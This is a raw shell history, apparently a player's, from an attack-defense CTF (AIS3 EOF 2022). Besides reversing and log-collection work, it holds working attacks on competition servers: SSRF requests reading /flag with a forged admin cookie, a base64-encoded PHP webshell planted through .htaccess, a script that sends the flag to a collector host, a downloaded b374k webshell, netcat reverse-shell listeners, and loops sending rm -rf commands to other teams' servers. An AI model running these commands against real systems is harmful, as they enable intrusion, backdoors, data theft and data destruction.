ip l
ip a
ip link set eth1 down
sudo ip link set eth1 down
sudo 
sudo su
ipa 
ip a
tmux
sudo su
curl pypi.python.org
sudo vi /etc/hosts
apt instal gdb
sudo apt install gdb
bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
gdb
ip a
mkdir exploit
ls
vi .ssh/authorized_keys 
ping a
ip a
ping 10.14.15.1
vi .ssh/authorized_keys 
ls
pip3 install cryptography
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
pip3 install cryptography
rust
tmux a
tmux a
pip install z3-solver
wget http://eof.ais3.org/files/e78c76631f16cfe0f2c9d935896d2adc/Mugyu.zip?token=eyJ1c2VyX2lkIjoyMCwidGVhbV9pZCI6MjIsImZpbGVfaWQiOjEwfQ.YgdArw.2ArLgIfd75Isge20D83s3uiqH58
mv Mugyu.zip\?token\=eyJ1c2VyX2lkIjoyMCwidGVhbV9pZCI6MjIsImZpbGVfaWQiOjEwfQ.YgdArw.2ArLgIfd75Isge20D83s3uiqH58 Mugyu.zip
ls
unzip Mugyu.zip 
sudo apt install unzip
unzip Mugyu.zip 
cd Mugyu/
ls
cat README.md 
./mugyu n3k0 
vi n3k0 
vi mugyu 
./n3k0 
r2
sudo apt install radare2
r2 n3k0 
ls
ll
r2 mugyu 
ls
./mugyu lov3
chmod +x lov3 
./mugyu lov3
vi lov3 
objdump n3k0 
objdump -d n3k0 
ls
./mugyu b3n3
./mugyu n3k0 
echoa |./mugyu n3k0 
echo a |./mugyu n3k0 
objdump -d n3k0 
strings n3k0 
vi n3k0 
pip install angr
wget https://raw.githubusercontent.com/angr/angr-doc/master/examples/b01lersctf2020_little_engine/solve.py
vi solve.py 
ls
cd Mugyu/
ls
strace
strace ./mugyu n3k0 
strace ./mugyu n3k0 2>a
cat a
cat a | grep open
python3 solve.py 
python3
ls
cd exploit/
ls
cp ssrf_file.sh ssrf_http.sh
vi ssrf_http.sh 
ip a
cp ssrf_file.sh ssrf_file2.sh
./ssrf_file2.sh 
cd exploit/
ls
cd ..
ls
vi score.sh 
chmod +x score.sh 
./score.sh 
ls
cd exploit/
ls
vi reg.sh 
cd ..
vi score.sh 
cd exploit/
ls
vi reg.sh 
./reg.sh 
vi reg.sh 
./reg.sh 
ls
vi defasess.sh 
./defasess.sh 
cat reg.sh 
ls
vi reg.sh 
./reg.sh 
vi reg.sh 
./reg.sh 
ls
vi defasess.sh 
./defasess.sh 
ls
vi ssrf_file
vi ssrf_file.sh 
./ssrf_
./ssrf_file.sh 
vi ssrf_file2.sh 
./ssrf_file2
./ssrf_file2.sh 
tmux
echo YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG | base64 -D
echo YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG | base64 -D=d
echo YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG | base64 -d
tmux
ls
tmux
tmux a
tmux 
tmux a
ls
git clone https://github.com/deviantony/docker-elk
cd docker-elk/
sudo docker compose up -d
sudo docker-compose up -d
docker-compose exec -T elasticsearch bin/elasticsearch-reset-password --batch --user elastic
sudo docker-compose exec -T elasticsearch bin/elasticsearch-reset-password --batch --user elastic
sudo docker-compose exec -T elasticsearch bin/elasticsearch-reset-password --batch --user kibana_system
sudo docker-compose exec -T elasticsearch bin/elasticsearch-reset-password --batch --user elastic
sudo docker-compose exec -T elasticsearch bin/elasticsearch-reset-password --batch --user kibana_system
ls
nano kibana/config/kibana.yml
nano logstash/pipeline/logstash.conf
nano docker-
nano docker-compose.yml 
sudo docker-compose up -d
ip a
exit
ls
cd imgura/
ls
ls log
pwd
ls
nano logger.php 
date
ls
cat log/new.log 
pwd
ls
cd log
pwd
ls
mv acc.log acc3.log
mv acc3.log acc.log
exit
htop
exit
ls
cd imgura/
ls
cd log
ls
vi acc.log 
jq . acc.log 
jq . acc.log  > /dev/null
ls
ls
cd docker-elk/
ls
cd ..
ls
cd exploit/
ls
cd ..
cd public
ls
cd ..
ls
cd imgura/
ls
less logger.php 
sudo docker ps
ip a
cd ..
ls
cd docker-elk/
nano docker-
nano docker-compose.yml 
nano ~/docker-elk/logstash/pipeline/logstash.conf
cdcd logstash/
cd logstash/
;ls
ls
cd config
ls
nano logstash.yml 
cd ..
ls
cd pipeline/
ls
nano logstash.conf 
cd ..
ls
nano Dockerfile 
cd ..
ls
cd imgura/
ls
nano logger.php 
cd ..
cd docker-elk/
ls
cd logstash/
ls
nano pipeline/logstash.conf 
tmux a
cd filebeat-8.0.0-linux-x86_64/logs
ls
tail -f filebeat-20220212-7.ndjson
tail -f filebeat-20220212-7.ndjson | jq
tail -f filebeat-20220212-8.ndjson | jq
tail -F filebeat-20220212-9.ndjson | jq
tail -F filebeat-20220212-10.ndjson | jq
cd ..
rm -r log
ls
rm -r logs
rm -r data
cd logs
ls
tail filebeat-20220212.ndjson | jq.
tail filebeat-20220212.ndjson | jq
tail -F filebeat-20220212.ndjson | jq
tail -F filebeat-20220212-1.ndjson | jq
tail -F filebeat-20220212-3.ndjson | jq
tail -F filebeat-20220212-4.ndjson | jq
cd /var/log/
ls
cd 
ls
cd imgura/
ls
cd log
ls
vi acc.log 
cat acc.log new.log
cat acc.log > new.log
rm new.log
cat acc.log > acc.2.log
echo >> acc.2.log
ip a | grep 121
ls
vi acc.2.log 
ls
ll
vi acclog
jq acc
jq acclog
vi acclog
ls
jq acclog
jq . acclog
jq '. + {time: 1644693739484}' acclog -c -r
jq '. + {time: 1644693739484}' acclog -c -r >> acc.2.log 
ls
echo >> acc.2.log
cd imgura/
ls
cd log
cat acc.log 
sudo su
tcpdump -i eof2022 
sudo tcpdump -i eof2022 
sudo tcpdump -i eof2022 tcp port 1234
lsof -i 
sudo tcpdump -i eof2022 tcp port 1234
lsof -i 
sudo tcpdump -i eof2022 tcp port 1234
ls
cd /proc
ls
ps aux | nc
ps aux |  grep nc
cd 36619
ls
cd fd
ls
echo -ne '\x04'
echo -ne '\x04' > 3
echo -ne '\x04' > 4
echo -ne '\x04' > 1
echo -ne '\x04' > 2
echo -ne '\x04' > 1
echo -ne '\x04' > 0
echo -ne '1' > 0
echo -ne '\x03' > 0
echo -ne '\x02' > 0
echo -ne '\x01' > 0
echo -ne '\x05' > 0
echo -ne '\x06' > 0
echo -ne '1' > 0
echo -ne '\x04' > 0
echo -ne '\x04\x04' > 0
echo -ne '\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04' > 0
echo -ne '\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04' > 3
lls
ll
cd ..
ls
cd ns
ls
cd ..
cd net
ls
cd ..
ls
cdtask
cd task
ls
cd 36619/
ls
cd ../..
ls
htop
ls
cd fd
ls
echo -ne '\x04\n' > 0
echo -ne '\x04\r' > 0
echo -ne '\x04\n' > 0
echo -ne '1234' > 0
echo -ne '\x04' > 0
echo -ne '\x16\x04' > 0
echo -ne '123' > 0
cd ..
cd
ls
cd /proc
ls
cd net
ls
cd /proc/36619
ls
cd fd
ls
ll
echo a >3
echo a >./3
echo a > 1
echo a > 0
nc -U 3
ls -alh
echo a > 4
echo a > 3
echo a > 0
echo a > 1
echo a > 0
echo a > 32
echo a > 3
ip a
asdf
ip a
tcpdump -i eof2022 icmp
sudo tcpdump -i eof2022 icmp
sudo tcpdump -i eof2022 tcp port 1234
nc -vlp 1234
fg
nc -vlp 1234
tmux ls
tmux a -t0
tmux a -t2
tmux a -t3
tmux a -t4
tmux a -t5
tmux a -t4
ls
dc sugar/
cd sugar/
cat flag 
ls
cat flag 
python3 exploit.py 
ls
cd sugar/
ls
python3 exploit.py 
ls
cat flag 
python3 exploit.py 
python3 exploit/
cd sugar/
python3 exploit.py 
ls
tmux a 5
tmux a -t 5
tmux a -t 4
tmux a -t 3
tmux a -t 2
tmux a -t 1
tmux a -t 0
ip a
tmux a -t 4
tmux a -t 5
tmux ls
tmux a -t 2
tmux a -t 5
tmux a -t 4
tmux a -t 5
tmux a -t 2
tmux a -t 4
ip a
ls
cd imgura/
ls
cd log
ls
cat acc.log 
docker ps
sudo su
ls
cd ..
ls
cat log
cat logger.php
ls
cat webroot/logger.php 
nano logger.php 
cp logger.php webroot/logger.php 
vi webroot/logger.php 
cat webroot/logger.php 
ls
vi webroot/logger.php 
vi webroot/logger.php ls
vi webroot/logger.php 
cd ..
ls
tmux -t 2
tmux a -t 2
tmux a
tmux a -t 2
tmux a -t 4
nc -lvnp 3000
ip a
nc -lvnp 3000
ls
cd /tmp
ls
wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.0.0-linux-x86_64.tar.gz
mv filebeat-8.0.0-linux-x86_64 ~/
cd ~
ls
cd filebeat-8.0.0-linux-x86_64/
ls
nano filebeat
nano filebeat.yml 
./filebeat setup
nano filebeat.yml 
./filebeat 
./filebeat --help
./filebeat -v -d
./filebeat -v
ls
vi filebeat.yml 
./filbeat modules
ls logs
less logs/filebeat-20220212-3.ndjson 
./filbeat 
./filebeat 
ls
cd log
cd logs
ls
tail -F filebeat-20220212.ndjson 
vi filebeat-20220212.ndjson 
tail -F filebeat-20220212.ndjson 
ls
cd ..
ls -alh
cd daa
cd data
ls
vi meta.json 
cd registry/
ls
cd filebeat/
ls
vi log.json 
cd ../../../
nano filebeat.yml 
./filebeat 
vi filebeat.yml 
./filebeat 
rm -r data
./filebeat setup
ls
vi filebeat.yml 
ls
cd public/
ls
wget https://raw.githubusercontent.com/b374k/b374k/master/index.php
ls
wget https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.3.php
mv b374k-3.2.3.php index.php 
vi index.php 
ls
cat score.sh 
sudo su
cd /etc/nginx/
sudo su
ls
tmux
tmux a -t 5
tmux a -t 4
tmux 3
tmux a
cat score.sh 
curl 127.0.0.1:13337
ls
cd imgura/
ls
cd log
ls
less acc.2.log 
ls
tail -F acc
tail -F acc.log
s
ls
cd ..
ls
ip a
nc -vlp 1234
cd /tmp
ls
nc -vlp 1234
ls
cd docker-elk/
sudo docker-compose down
ls
vi docker-compose.yml 
cd elasticsearch/
ls
vi Dockerfile 
cd ..
ls
cat docker-compose.yml 
ls
cat README.md 
cd ..
docker pull docker.elastic.co/elasticsearch/elasticsearch:8.0.0
sudo docker pull docker.elastic.co/elasticsearch/elasticsearch:8.0.0
docker run -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" --name=es docker.elastic.co/elasticsearch/elasticsearch:8.0.0
sudo docker run -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" --name=es docker.elastic.co/elasticsearch/elasticsearch:8.0.0
sudo docker run -d -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" --name=es docker.elastic.co/elasticsearch/elasticsearch:8.0.0
sudo su
history | grep requestbin
ls
cd imgura/
ls
cd webroot/
ls
cd ../..
ls
cd NPY
ls
cd ..
ls
cd Mugyu/
ls
cd ..
ls
mv release\ \(3\).zip imgura-service.zip
unzip imgura
unzip imgura-service.zip 
cd service-dev/
ls
sudo su
ip a
ls
cd service-dev/
ls
ip a
ls
cat docker-compose.yml 
ls
cd files/
ls
cat waf.php 
ip a
ls
sudo su
nc -vlp 1234
ls
cd ad
ls
cat attack_htaccess 
vi attack_htaccess
base64 attack_htaccess | tr -d '\n'
ls
cat backdoor_htaccess 
vi ls
ls
cat backdoor_htaccess 
cat attack_htaccess 
base64 attack_htaccess | base64 | tr -d '\n'
df -h
base64 attack_htaccess | base64 | tr -d '\n'
base64 attack_htaccess |  tr -d '\n'
python3 deploy.py 
ls
cd exploit/
ls
vi htacc.sh 
ls
vi meow.sh 
./ht_rec
./ht_rec.sh 
./htacc.sh 
cat htacc.sh 
./htacc.sh 
ls
./htacc.sh 
ls
vi htacc.sh 
ls
cd imgura/
ls
cd log
ls
tail -F acc.2.log | grep 10.14.15.102
tail -F acc.2.log | grep 10.14.15.102 | jq .
htop
nc -vlp 1234
ls
df -h
cd /var/www/html/
ls
cd /var/log/nginx/
ls
ls -alh
nc -vlp 30018
cat /etc/nginx/sites-enabled/default 
nc -vlp 30018
cd exploit/
while true; do ./reg.sh ; ./defasess.sh ;done
while true; do ./ssrf_file.sh ; ./ssrf_file2.sh; sleep 10; done
vi ssrf_file.sh 
while true; do ./ssrf_file.sh ; ./ssrf_file2.sh; sleep 10; done
vi ssrf_file2.sh 
while true; do ./ssrf_file.sh ; ./ssrf_file2.sh; sleep 10; done
cat flag.log 
curl 0:8765/test
ls
cat flag.log 
ls
curl 0:8765/test
ls
cat flag.log
curl 0:8765/test
cat flag.log
curl 0:8765/test
cat flag.log
lsof -i | grep LISTEN
sudo lsof -i | grep LISTEN
curl 0:8765/test
cd exploit/
sed 'a'
ls
sed 's///g' attack_revflag.sh 
sed 's/%id%/1/g' attack_revflag.sh 
ls
./ssrf_http.sh 
./reg.sh 
./ssrf_http.sh 
ls
cat meow.sh 
ls
vi htacc.sh 
cat attack_revflag.sh 
ls
vi meow.sh 
vi ht_rec.sh 
./ht_rec.sh 
./htacc.sh.sh 
./htacc.sh
cd /var/log
ls
cd nginx/
ls
sudo su
la
ls
cd exploit/
ls
cd ..
vi score.sh
curl -X http://chals2.eof.ais3.org:30022/admin/backup
curl -X POST http://chals2.eof.ais3.org:30022/admin/backup
ls
cd exploit/
ls
vi reg.sh
chmod +x reg.sh 
./reg.sh 
vi reg.sh 
./reg.sh 
vi defasess.sh
vi reg.sh 
vi defasess.sh 
chmod +x defasess.sh 
./defasess.sh 
vi defasess.sh 
./defasess.sh 
./defasess.sh | grep seadog007
./defasess.sh | grep seadog007 -A5
./defasess.sh | grep seadog007 -A4 | tail -n1
./defasess.sh | grep seadog007 -A4 | tail -n1 | grep -oP 'value="\K\d+(?=")'
vi defasess.sh 
./defasess.sh 
vi defasess.sh 
./defasess.sh 
vi defasess.sh 
./defasess.sh 
vi defasess.sh 
ls
vi reg.sh 
./reg.sh 
ls
./defasess.sh 
cp defasess.sh checkuser.sh
vi checkuser.sh 
./defasess.sh 
./reg.sh 
./defasess.sh 
./reg.sh 
cat reg
cat reg.sh 
./reg.sh 
./defasess.sh 
ls
vi ssrf_file.sh
cp defasess.sh ssrf_file.sh
vi ssrf_file.sh 
i=30022
curl 'http://chals2.eof.ais3.org:'$i'/upload' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nfile:///flag\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm'
curl 'http://chals2.eof.ais3.org:'$i'/upload' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nfile:///flag\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm' | grep -oP 'url=\K.+/view/.*?(?=")'
curkl http://chals2.eof.ais3.org:30022/view/riZ00hCT
curl http://chals2.eof.ais3.org:30022/view/riZ00hCT
ls
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
curl 'http://chals2.eof.ais3.org:'$i'/upload' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nfile:///flag\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm' | grep -oP 'url=\K.+/view/.*?(?=")'
curl http://chals2.eof.ais3.org:30022/view/E_4yivu-
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
apt install jq
sudo apt install jq
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
./ssrf_file.sh 
vi ssrf_file.sh 
while; do ./ssrf_file.sh ; sleep 60; done
while true; do ./ssrf_file.sh ; sleep 60; done
vi ssrf_file.sh 
while true; do ./ssrf_file.sh ; sleep 60; done
while true; do ./ssrf_file.sh ; sleep 10; done
while true; do ./ssrf_file.sh ; ./ssrf_file2.sh; sleep 10; done
cd exploit/
vi meow.sh 
vi ht_rec.sh 
vi htacc.sh 
./htacc.sh 
bash -x ./ht
bash -x ./htacc.sh 
curl http://chals2.eof.ais3.org:30001/uploads/.htaccess -F p=seadog007test1234 -F w=echo%20IyEvYmluL2Jhc2gKCndoaWxlIHRydWUKZG8KaWQ9MQpmbGFnPSIkKGNhdCAvZmxhZykiCmN1cmwgLXMgJ2h0dHA6Ly8xMC4xNC4xNS4xMTk6ODc2NS9hcGkvZmxhZycgLUggJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbicgLUggIlVzZXItQWdlbnQ6ICRmbGFnIiAtLWRhdGEgJ3siaWQiOiAnJGlkJywgImZsYWciOiAiJyRmbGFnJyJ9JyAtLWNvbm5lY3QtdGltZW91dCAxCnNsZWVwIDEKZG9uZQo=%7cbase64%20%2dd%20%3e/tmp/rev.sh
ls
vi meow.sh 
grep '-F'
grep '-F' *
grep -'-F' *
grep $'-F' *
grep ' -F' *
vi ht_rec.sh
grep ' -F' *
vi htacc.sh
cat attack_revflag.sh 
./htacc.sh 
vi htacc.sh 
./htacc.sh 
vi htacc.sh 
./htacc.sh 
ls
./reg.sh 
./checkuser.sh 
ls
vi htacc.sh 
cat ht_rec.sh 
ks
ls
vi ssrf_http.sh 
ls
vi ssrf_http.sh 
./ssrf_http.sh 
ls
vi ht_rec2.sh 
./htacc.sh 
ls
cat attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
ls
cat meow.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
ls
cat attack_revflag.sh 
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
vi attack_revflag.sh 
base64 attack_revflag.sh | tr -d '\n'
ls
cat attack_revflag.sh 
vi attack_revflag.sh 
vi meow.sh 
ls
./htacc.sh 
ls
ls
cd exploit/
ls
cp ssrf_file.sh
cp ssrf_file.sh meow.sh
vi meow.sh 
./meow.sh 
vi meow.sh 
./meow.sh 
vi meow.sh 
while true; do ./meow.sh; sleep 10; done
ls
vi meow.sh 
while true; do ./meow.sh; sleep 10; done
i=30001
curl 'http://chals2.eof.ais3.org:'$i'/uploads/YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG.php?meow=cat%20/flag'
curl 'http://chals2.eof.ais3.org:'$i'/uploads/YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG.php?meow=cat%20/flag' | grep -oP 'EOF{.*}'
curl 'http://chals2.eof.ais3.org:'$i'/uploads/YPhZu0C7qY9wYWtLQTAkkPsvY6fUpKVG.php?meow=cat%20/flag' | grep -oP 'EOF{.*?}'
vi meow.sh 
while true; do ./meow.sh; sleep 10; done
ls
vi meow.sh 
while true; do ./meow.sh; sleep 10; done
ls
cd exploit/
ls
cd ..
ls
cd exploit/
ls
vi meow.sh 
vi meow.sh
vi meow.sh 
vi ssrf_file
cat ssrf_file.sh 
cat ssrf_file2.sh 
vi meow
vi htacc.sh
cp htacc.sh ht_rec.sh
vi ht_rec.sh 
chmod +x ht
chmod +x htacc.sh 
chmod +x ht_rec.sh 
./ht_rec.sh 
ls
cat meow.sh 
ls
while true; do bash ht_rec.sh; sleep 10; done
cat ht_rec
cat ht_rec.sh 
while true; do bash ht_rec.sh; sleep 10; done
vi ht_rec2.sh
chmod +x ht_rec2.sh 
./ht_rec2.sh 
vi ht_rec2.sh
./ht_rec2.sh 
while true; do ./ht_rec2.sh; sleep 20 ; done
vi ht_rec2.sh 
while true; do ./ht_rec2.sh; sleep 20 ; done
mkdir public
cd public/
ls
python -m http.server
python3 -m http.server
cd exploit/
vi meow.sh 
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/logs/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/backup/.test.hahaha' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm -rf /var/www/html/backup/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm -rf /var/www/html/backup/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm -rf /var/www/html/backup/*' --connect-timeout 1 --max-time 1 | head -n1& done; sleep 0.2; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/*/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /tmp/hack.sh' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /tmp/hack.sh' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /tmp/hack.sh' --connect-timeout 1 --max-time 1 | head -n1& done; sleep 0.2; done
nc -vlp 30031
ps aux
nc -vlp 30031
ps aux
nc -vlp 30031
rm -rf /var/www/html/uploads/* /var/www/html/backup/* /var/www/html/backup/.*.php
echo IyA8P3BocCBvYl9jbGVhbigpOyBpZihpc3NldCgkX1BPU1RbInAiXSkmJmlzc2V0KCRfUE9TVFsidyJdKSlpZihoYXNoKCJzaGExIiwkX1BPU1RbInAiXSk9PT0iY2VkYmY3NWRlOGIwODM3Yzc2NWUwYTgyNGQ4ZjRkMzczNWYzZTBlMCIpQHN5c3RlbSgkX1BPU1RbInciXSk7IGRpZSgpOyA/Pgo8RmlsZXMgfiAiXlwuaHQiPgogICAgUmVxdWlyZSBhbGwgZ3JhbnRlZAogICAgT3JkZXIgYWxsb3csZGVueQogICAgQWxsb3cgZnJvbSAxMC4xNC4xNS4xMTkKICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggXC5waHAkPgogICAgU2V0SGFuZGxlciBOb25lCjwvRmlsZXNNYXRjaD4K|base64 -d >/var/www/html/logs/.htaccess; rm -rf /var/www/html/uploads/* /var/www/html/backup/* /var/www/html/backup/.*.php /var/www/html/backup/.test.hahaha
ls
nc -vlp 30030
cat /flag
nohup bash /tmp/flag.sh &
nc -vlp 30030
rm -rf /var/www/html/uploads/* /var/www/html/backup/* /var/www/html/backup/.*.php
echo IyA8P3BocCBvYl9jbGVhbigpOyBpZihpc3NldCgkX1BPU1RbInAiXSkmJmlzc2V0KCRfUE9TVFsidyJdKSlpZihoYXNoKCJzaGExIiwkX1BPU1RbInAiXSk9PT0iY2VkYmY3NWRlOGIwODM3Yzc2NWUwYTgyNGQ4ZjRkMzczNWYzZTBlMCIpQHN5c3RlbSgkX1BPU1RbInciXSk7IGRpZSgpOyA/Pgo8RmlsZXMgfiAiXlwuaHQiPgogICAgUmVxdWlyZSBhbGwgZ3JhbnRlZAogICAgT3JkZXIgYWxsb3csZGVueQogICAgQWxsb3cgZnJvbSAxMC4xNC4xNS4xMTkKICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggXC5waHAkPgogICAgU2V0SGFuZGxlciBOb25lCjwvRmlsZXNNYXRjaD4K|base64 -d >/var/www/html/logs/.htaccess; rm -rf /var/www/html/uploads/* /var/www/html/backup/* /var/www/html/backup/.*.php /var/www/html/backup/.test.hahaha
ls
nc -vlp 30025
ls
nc -vlp 30018
nc -vlp 30021
nc -vlp 30042
nload
htop
tmux a
ip a
ls
tmux
tmux a -t 4
tmux a
tmux a
tmux ls
tmux a -t 4
tmux a -t 0
tmux a -t 2
tmux a -t 5
tmux
tmux a -t 3
nc -vlp 30023
nc -vlp 30020
ps aux
nc -vlp 30020
nc -vlp 30026
nc 30001
nc -vlp 30001
nc -vlp 30027
nc -vlp 30028
nc -vlp 30032
cat /flag
nohup bash /tmp/flag.sh &
nc -vlp 30032
echo IyA8P3BocCBvYl9jbGVhbigpOyBpZihpc3NldCgkX1BPU1RbInAiXSkmJmlzc2V0KCRfUE9TVFsidyJdKSlpZihoYXNoKCJzaGExIiwkX1BPU1RbInAiXSk9PT0iY2VkYmY3NWRlOGIwODM3Yzc2NWUwYTgyNGQ4ZjRkMzczNWYzZTBlMCIpQHN5c3RlbSgkX1BPU1RbInciXSk7IGRpZSgpOyA/Pgo8RmlsZXMgfiAiXlwuaHQiPgogICAgUmVxdWlyZSBhbGwgZ3JhbnRlZAogICAgT3JkZXIgYWxsb3csZGVueQogICAgQWxsb3cgZnJvbSAxMC4xNC4xNS4xMTkKICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggXC5waHAkPgogICAgU2V0SGFuZGxlciBOb25lCjwvRmlsZXNNYXRjaD4K|base64 -d >/var/www/html/logs/.htaccess; rm -rf /var/www/html/uploads/* /var/www/html/backup/*
nc -vlp 30032
nc -vlp 30019
df -h
nc -vlp 30019
nc -vlp 30024
nc -vlp 30032
cat 
nc -vlp 30032
cat /flag
nohup bash /tmp/flag.sh &
nc -vlp 30032
echo IyA8P3BocCBvYl9jbGVhbigpOyBpZihpc3NldCgkX1BPU1RbInAiXSkmJmlzc2V0KCRfUE9TVFsidyJdKSlpZihoYXNoKCJzaGExIiwkX1BPU1RbInAiXSk9PT0iY2VkYmY3NWRlOGIwODM3Yzc2NWUwYTgyNGQ4ZjRkMzczNWYzZTBlMCIpQHN5c3RlbSgkX1BPU1RbInciXSk7IGRpZSgpOyA/Pgo8RmlsZXMgfiAiXlwuaHQiPgogICAgUmVxdWlyZSBhbGwgZ3JhbnRlZAogICAgT3JkZXIgYWxsb3csZGVueQogICAgQWxsb3cgZnJvbSAxMC4xNC4xNS4xMTkKICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlcz4KPEZpbGVzTWF0Y2ggXC5waHAkPgogICAgU2V0SGFuZGxlciBOb25lCjwvRmlsZXNNYXRjaD4K|base64 -d >/var/www/html/logs/.htaccess; rm -rf /var/www/html/uploads/* /var/www/html/backup/*
nc -vlp 30032
nc -vlp 30029
nc -vlp 1234
nc -vlp 30034
nc -vlp 30033
nc -vlp 30038
nc -vlp 30035
nc -vlp 30041
nc -vlp 30037
nc -vlp 30036
nc -vlp 30039
nc -vlp 30040
rm -r .npm
sudo rm -r .npm
rm -r .cache
while true; do for i in `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/uploads/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
while true; do for i in 30001 `seq 30018 30042`; do echo $i; curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=rm /var/www/html/uploads/*' --connect-timeout 1 --max-time 1 | head -n1; done; done
